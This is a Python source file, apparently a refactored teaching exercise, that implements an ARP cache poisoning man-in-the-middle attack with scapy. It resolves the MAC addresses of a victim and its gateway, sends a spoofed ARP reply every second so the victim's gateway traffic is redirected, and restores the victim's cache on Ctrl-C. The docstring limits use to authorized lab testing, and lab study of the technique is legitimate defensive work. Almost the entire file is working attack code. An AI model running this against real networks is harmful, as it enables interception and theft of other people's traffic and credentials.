#!/usr/bin/env python3
"""ARP cache poisoning (man-in-the-middle) demonstration.

EDUCATIONAL / AUTHORIZED-TESTING USE ONLY. Run only inside an isolated lab
network you own, or with explicit written permission. See this folder's
README.md for how the technique works and, more importantly, how to detect
and defend against it.

This is a legacy learning exercise, refactored to modern Python 3 for
readability. It is a reference implementation, not a turnkey tool.
"""

from __future__ import annotations

import time
from typing import Optional

from scapy.all import ARP, Ether, sendp, srp

# --- Protocol / behaviour constants (no magic numbers in the logic below) ---
BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
ARP_OP_REQUEST = 1          # "who-has"
ARP_OP_REPLY = 2            # "is-at"
RESOLVE_RETRIES = 2
RESOLVE_TIMEOUT_S = 7
POISON_INTERVAL_S = 1       # delay between spoofed replies
RESTORE_REPLY_COUNT = 5     # corrective replies sent when restoring


def resolve_mac(ip_address: str, interface: str) -> Optional[str]:
    """Return the MAC address behind *ip_address*, or ``None`` if unanswered."""
    answered, _unanswered = srp(
        Ether(dst=BROADCAST_MAC) / ARP(op=ARP_OP_REQUEST, pdst=ip_address),
        retry=RESOLVE_RETRIES,
        timeout=RESOLVE_TIMEOUT_S,
        iface=interface,
        verbose=0,
    )
    for _sent, received in answered:
        return received[ARP].hwsrc
    return None


def poison(target_ip: str, gateway_ip: str, interface: str) -> None:
    """Repeatedly tell *target_ip* that *gateway_ip* is at our MAC (a MITM).

    Runs until interrupted (Ctrl-C), then restores the victim's ARP cache.
    """
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    target_mac = resolve_mac(target_ip, interface)
    if target_mac is None:
        print(f"[!] Could not resolve MAC for {target_ip}; aborting.")
        return

    gateway_mac = resolve_mac(gateway_ip, interface)
    spoofed_reply = Ether() / ARP(
        op=ARP_OP_REPLY, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip
    )
    try:
        while True:
            sendp(spoofed_reply, iface=interface, verbose=0)
            time.sleep(POISON_INTERVAL_S)
    except KeyboardInterrupt:
        print("\n[*] Stopping; restoring the victim's ARP cache.")
        if gateway_mac is not None:
            restore(target_ip, target_mac, gateway_ip, gateway_mac, interface)


def restore(
    target_ip: str,
    target_mac: str,
    gateway_ip: str,
    gateway_mac: str,
    interface: str,
) -> None:
    """Send corrective ARP replies so *target_ip* relearns the real gateway MAC."""
    sendp(
        Ether(dst=BROADCAST_MAC)
        / ARP(op=ARP_OP_REPLY, pdst=target_ip, hwdst=target_mac,
              psrc=gateway_ip, hwsrc=gateway_mac),
        count=RESTORE_REPLY_COUNT,
        iface=interface,
        verbose=0,
    )
